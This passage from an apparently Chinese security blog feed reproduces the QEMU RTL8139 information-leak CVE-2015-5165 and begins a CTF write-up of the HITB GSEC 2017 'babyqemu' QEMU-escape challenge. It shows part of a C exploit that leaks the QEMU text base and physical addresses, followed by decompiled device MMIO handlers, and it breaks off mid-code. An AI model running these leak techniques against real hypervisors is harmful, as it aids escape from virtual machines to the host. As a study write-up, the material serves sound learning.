class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);</span><br><span class="line">    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);</span><br><span class="line">    rtl8139_card_config();</span><br><span class="line">    rtl8139_packet_send(rtl8139_tx_buffer, packet, <span class="keyword">sizeof</span>(packet));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rtl8139_rx_nb; ++i) &#123;</span><br><span class="line">    <span class="comment">// for (int i = 0; i &lt; 2; ++i) &#123;</span></span><br><span class="line">        xxd((<span class="keyword">uint8_t</span> *)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> text_base_addr = leak_text_base_addr(rtl8139_rx_ring, rtl8139_rx_nb);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Text base address: 0x%llx\n&quot;</span>, text_base_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> physical_addr = leak_physical_addr(rtl8139_rx_ring, rtl8139_rx_nb);  <span class="comment">// ERROR</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Physical address: 0x%llx\n&quot;</span>, physical_addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ol><li><code>ifconfig</code>得到的MAC地址是<code>52:54:00:12:34:56</code>，但是<code>rtl8139_do_receive</code>中进行比对时，比对的MAC地址是<code>52:54:00:12:34:57</code>。</li><li>与前人的exploit对比得知，函数的偏移有所变化（如<code>property_get_bool</code>），应该是编译的问题。需要自行查看泄露的数据，进行验证。</li><li>使用<code>scp</code>命令拷贝到客户机，无法拷贝成功。后使用<code>python3 -m http.server</code>进行文件的传输。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><ol><li><a href="https://stackoverflow.com/questions/12214746/find-a-commit-on-github-given-the-commit-hash/28053469">git - Find a commit on GitHub given the commit hash - Stack Overflow</a></li><li><a href="https://wiki.osdev.org/RTL8139">RTL8139 - OSDev Wiki</a></li><li><a href="https://zh.m.wikipedia.org/zh-hans/%E4%BB%A5%E5%A4%AA%E7%BD%91%E5%B8%A7%E6%A0%BC%E5%BC%8F">以太网帧格式 - 维基百科，自由的百科全书 (wikipedia.org)</a></li><li><a href="https://www.cnblogs.com/AhuntSun-blog/p/12230694.html">IP 数据报 - AhuntSun - 博客园 (cnblogs.com)</a></li><li><a href="https://blog.csdn.net/zhshulin/article/details/62888061">一张图了解TCP/IP五层网络模型_在路上-CSDN博客</a></li></ol><h3 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h3><ol><li><a href="https://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/#more">QEMU 信息泄露漏洞 CVE-2015-5165 分析及利用 | 程序人生 (programlife.net)</a></li><li><a href="http://www.phrack.org/papers/vm-escape-qemu-case-study.html">.:: Phrack Magazine ::. QEMU Case Study</a></li><li><a href="https://github.com/Resery/Virtualized_Learning/tree/master/Vulnerability/CVE-2015-5165">Virtualized_Learning/Vulnerability/CVE-2015-5165 at master · Resery/Virtualized_Learning</a></li><li><a href="https://ray-cp.github.io/archivers/qemu-pwn-cve-2015-5165%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">qemu-pwn-cve-2015-5165信息泄露漏洞分析 « 纵有寂寂无名时 (ray-cp.github.io)</a></li><li><a href="https://dangokyo.me/2018/03/08/qemu-escape-part-3-information-leakage-cve-2015-5165/">QEMU escape: Part 3 Information Leakage (CVE-2015-5165) – 氷 菓 (dangokyo.me)</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;参考大佬们的文章复现CVE-2015-5165。&lt;/p&gt;
&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;宿主机环境 Ubuntu 20.10&lt;/p&gt;
&lt;h3 id=&quot;QEMU编译&quot;&gt;&lt;a href=&quot;#QEMU编译&quot; class=&quot;headerlink&quot; title=&quot;QEMU编译&quot;&gt;&lt;/a&gt;QEMU编译&lt;/h3&gt;&lt;p&gt;QEMU &lt;a href=&quot;https://github.com/qemu/qemu/tree/bd80b5963f58c601f31d3186b89887bf8e182fb5&quot;&gt;commit-bd80b59&lt;/a&gt;源码下载。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; unzip qemu.zip&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; mkdir -p bin/debug/native&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; bin/debug/native&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; ../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; make&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;如果出现以下错误，给文件 &lt;code&gt;commands-posix.c&lt;/code&gt; 增加头文件 &lt;code&gt;&amp;lt;sys/sysmacros.h&amp;gt;&lt;/code&gt; 即可解决。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/repo/qemu/qga/commands-posix.c:640: undefined reference to `major&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/bin/ld: /repo/qemu/qga/commands-posix.c:641: undefined reference to `minor&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;制作QEMU虚拟机&quot;&gt;&lt;a href=&quot;#制作QEMU虚拟机&quot; class=&quot;headerlink&quot; title=&quot;制作QEMU虚拟机&quot;&gt;&lt;/a&gt;制作QEMU虚拟机&lt;/h3&gt;&lt;p&gt;这里我使用的Ubuntu 16.04 Server i386作为QEMU客户机系统。点击&lt;a href=&quot;https://mirrors6.tuna.tsinghua.edu.cn/ubuntu-releases/xenial/ubuntu-16.04.6-server-i386.iso&quot;&gt;下载&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;还需要下载安装VNC-Viewer，稍后会用到。&lt;a href=&quot;https://www.realvnc.com/en/connect/download/viewer/linux/&quot;&gt;链接&lt;/a&gt;。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; ./qemu-img create -f qcow2 ~/tmp/vm/ubuntu.img 10G&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sudo dpkg -i VNC-Viewer-6.20.529-Linux-x64.deb&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; x86_64-softmmu/qemu-system-x86_64 -boot d -cdrom \  &lt;span class=&quot;comment&quot;&gt;# 能用嵌套虚拟就用(添加--enable-kvm)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;~/tmp/iso/ubuntu-16.04.6-server-i386.iso \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-hda ~/tmp/vm/ubuntu.img -m 1024&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; vncviewer host:port  &lt;span class=&quot;comment&quot;&gt;# 连接上，安装就好&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;（尽量使用–enable-kvm，否则卡的受不了，安装系统安了四五个小时。。。）&lt;/p&gt;</summary>
    
    
    
    
    <category term="QEMU" scheme="http://hhdx.xyz/tags/QEMU/"/>
    
    <category term="CVE" scheme="http://hhdx.xyz/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>HITB GSEC 2017：babyqemu</title>
    <link href="http://hhdx.xyz/2020/11/30/babyqemu/"/>
    <id>http://hhdx.xyz/2020/11/30/babyqemu/</id>
    <published>2020-11-30T04:05:03.000Z</published>
    <updated>2020-11-30T05:10:54.060Z</updated>
    
    <content type="html"><![CDATA[<p>题目下载地址：<a href="https://github.com/kitctf/writeups/blob/master/hitb-gsec-2017/babyqemu/babyqemu.tar.gz">babyqemu.tar.gz</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><code>tar xvzf babyqemu.tar.gz</code>解压看到启动脚本<code>launch.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-kernel ./vmlinuz-4.8.0-52-generic \</span><br><span class="line">-append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; \</span><br><span class="line">-enable-kvm \     # 需要CPU virtualization，现在与hyper-v共存的VMware不支持此选项。可以删掉</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M --nographic  -L ./dependency/usr/local/share/qemu \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-device hitb,id=vda</span><br></pre></td></tr></table></figure><p>在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到<code>HitbState</code>结构体，其中还包含<code>dma_state</code>结构体。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">00000000 HitbState       struc ; (sizeof&#x3D;0x1BD0, align&#x3D;0x10, copyof_1495)</span><br><span class="line">00000000 pdev            PCIDevice_0 ?</span><br><span class="line">000009F0 mmio            MemoryRegion_0 ?</span><br><span class="line">00000AF0 thread          QemuThread_0 ?</span><br><span class="line">00000AF8 thr_mutex       QemuMutex_0 ?</span><br><span class="line">00000B20 thr_cond        QemuCond_0 ?</span><br><span class="line">00000B50 stopping        db ?</span><br><span class="line">00000B51                 db ? ; undefined</span><br><span class="line">00000B52                 db ? ; undefined</span><br><span class="line">00000B53                 db ? ; undefined</span><br><span class="line">00000B54 addr4           dd ?</span><br><span class="line">00000B58 fact            dd ?</span><br><span class="line">00000B5C status          dd ?</span><br><span class="line">00000B60 irq_status      dd ?</span><br><span class="line">00000B64                 db ? ; undefined</span><br><span class="line">00000B65                 db ? ; undefined</span><br><span class="line">00000B66                 db ? ; undefined</span><br><span class="line">00000B67                 db ? ; undefined</span><br><span class="line">00000B68 dma             dma_state ?</span><br><span class="line">00000B88 dma_timer       QEMUTimer_0 ?</span><br><span class="line">00000BB8 dma_buf         db 4096 dup(?)</span><br><span class="line">00001BB8 enc             dq ?                    ; offset</span><br><span class="line">00001BC0 dma_mask        dq ?</span><br><span class="line">00001BC8                 db ? ; undefined</span><br><span class="line">00001BC9                 db ? ; undefined</span><br><span class="line">00001BCA                 db ? ; undefined</span><br><span class="line">00001BCB                 db ? ; undefined</span><br><span class="line">00001BCC                 db ? ; undefined</span><br><span class="line">00001BCD                 db ? ; undefined</span><br><span class="line">00001BCE                 db ? ; undefined</span><br><span class="line">00001BCF                 db ? ; undefined</span><br><span class="line">00001BD0 HitbState       ends</span><br><span class="line">00001BD0</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 dma_state       struc ; (sizeof&#x3D;0x20, align&#x3D;0x8, copyof_1493)</span><br><span class="line">00000000                                         ; XREF: HitbState&#x2F;r</span><br><span class="line">00000000 src             dq ?</span><br><span class="line">00000008 dst             dq ?</span><br><span class="line">00000010 cnt             dq ?</span><br><span class="line">00000018 cmd             dq ?</span><br><span class="line">00000020 dma_state       ends</span><br></pre></td></tr></table></figure><p>通过查看<code>hitb_class_init</code>函数找到vendor_id和device_id。在虚拟机里面查看具体信息。（这个busybox+kernel的虚拟机中的<code>lspci</code>指令比常规少一些选项，不像前一个题目STRNG中是一个完整的ubuntu发行版）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> lspci --<span class="built_in">help</span></span></span><br><span class="line">BusyBox v1.26.2 (2017-05-26 14:27:34 CST) multi-call binary.</span><br><span class="line"></span><br><span class="line">Usage: lspci [-mk]</span><br><span class="line"></span><br><span class="line">List all PCI devices</span><br><span class="line"></span><br><span class="line">-mParsable output</span><br><span class="line">-kShow driver</span><br><span class="line"><span class="meta">$</span><span class="bash"> lspci</span></span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2333</span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource</span></span><br><span class="line">0x00000000fea00000 0x00000000feafffff 0x0000000000040200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>在<code>pci_hitb_realize</code>函数中观察到使用<code>timer_init_tl</code>初始化了一个timer时钟，和通过<code>memory_region_init_io</code>初始化了MMIO。</p><p>MMIO的<code>hitb_mmio_read</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">hitb_mmio_read</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> val; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x80</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;dma.src;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">0x8C</span> )</span><br><span class="line">        <span class="keyword">return</span> *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.dst + <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">0x8C</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">0x84</span> )</span><br><span class="line">          <span class="keyword">return</span> *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.src + <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">0x88</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.dst;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">0x90</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.cnt;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">0x98</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        val = opaque-&gt;fact;</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0x10000ED</span>LL;</span><br><span class="line">        <span class="keyword">if</span> ( !addr )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;addr4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">0x20</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;status;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">0x24</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;irq_status;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">-1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><code>addr == 0x80</code> ——&gt; 读取dma.src</li><li><code>addr == 0x84</code> ——&gt; 读取dma.src高地址处4字节</li><li><code>addr == 0x88</code> ——&gt; 读取dma.dst</li><li><code>addr == 0x8c</code> ——&gt; 读取dma.dst高地址处4字节</li><li><code>addr == 0x90</code> ——&gt; 读取dma.cnt</li><li><code>addr == 0x98</code> ——&gt; 读取dma.cmd</li></ol><p>MMIO的<code>hitb_mmio_write</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_mmio_write</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> v4; <span class="comment">// er13</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">int64_t</span> v7; <span class="comment">// rax</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// !((size - 4) &amp; 0xFFFFFFFB) 等价于测试size第4bit是否为1并且低3bit是否为0</span></span><br><span class="line">  <span class="keyword">if</span> ( (addr &gt; <span class="number">0x7F</span> || size == <span class="number">4</span>) &amp;&amp; (!((size - <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFB</span>) || addr &lt;= <span class="number">0x7F</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x80</span> )  <span class="comment">// 设置dma.src</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(opaque-&gt;dma.cmd &amp; <span class="number">1</span>) )</span><br><span class="line">        opaque-&gt;dma.src = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = val;</span><br><span class="line">      <span class="keyword">if</span> ( addr &gt; <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">0x8C</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !(opaque-&gt;dma.cmd &amp; <span class="number">1</span>) )</span><br><span class="line">            *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.dst + <span class="number">4</span>) = 